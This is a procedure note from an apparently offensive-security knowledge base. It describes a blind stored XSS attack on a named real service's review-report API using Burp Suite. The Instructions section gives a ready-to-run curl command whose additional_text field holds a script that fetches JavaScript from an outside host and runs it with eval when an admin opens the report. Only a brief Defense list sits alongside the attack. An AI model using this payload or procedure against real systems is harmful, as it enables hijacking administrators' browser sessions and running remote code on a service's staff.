---
tags:
  - xss
  - http-request
  - burp-suite
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-send-xss-report]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:39.104Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 134abec4-f654-41fb-830a-af44bd0a211a
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Send-Review-Report-Request-with-Burp-Suite

## Summary

This procedure submits a malicious review report to the Zomato API using Burp Suite to intercept and inject the XSS payload into the additional_text parameter, storing it for later admin panel rendering.

## Description

The Zomato Business app allows reporting reviews via POST to /v2/merchant/report_review. The endpoint lacks input sanitization on additional_text, storing it raw. Using Burp Suite, intercept a legitimate report request, modify it with the payload, and forward it. This exploits the blind nature as the attacker doesn't see immediate execution but knows it triggers on admin view. Expected outcome: Payload stored, ready for admin interaction.

## Requirements

1. Burp Suite configured as proxy
2. Valid X-Access-Token header
3. Specific review_id (e.g., 32288944) that is reportable

## Defense

Defensive measures and detection strategies:

- Validate and sanitize additional_text on input (e.g., strip script tags, escape HTML)
- Rate-limit report submissions per user
- Log and alert on reports with suspicious content (e.g., script patterns)

## Objectives

1. Successfully store XSS payload in backend
2. Confirm request acceptance
3. Set up for admin-side trigger

## Instructions

### Step 1: Intercept Legitimate Request

**Context**: Start a Burp Suite proxy session to capture a standard review report request from the app or browser.

**Command** (No direct command; use Burp UI):

> In Burp Suite, configure browser proxy to 127.0.0.1:8080, navigate to report a review, and intercept in Proxy > Intercept tab.

### Step 2: Modify and Send Request

**Context**: Replace additional_text with XSS payload and forward the request.

**Command** ([[commands/curl-send-xss-report]]):
```bash
curl -X POST 'https://www.zomato.com/api/v2/merchant/report_review' \
  -H 'X-Access-Token: YOUR_VALID_TOKEN' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'reason_id=5&review_id=32288944&additional_text=<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//ks.xss.ht");a.send();</script>'
```

> Expected output: HTTP/1.1 200 OK with JSON response indicating successful report. In Burp, forward intercepted request after modification.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/curl-send-xss-report]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- [[xss]]
- [[http-request]]
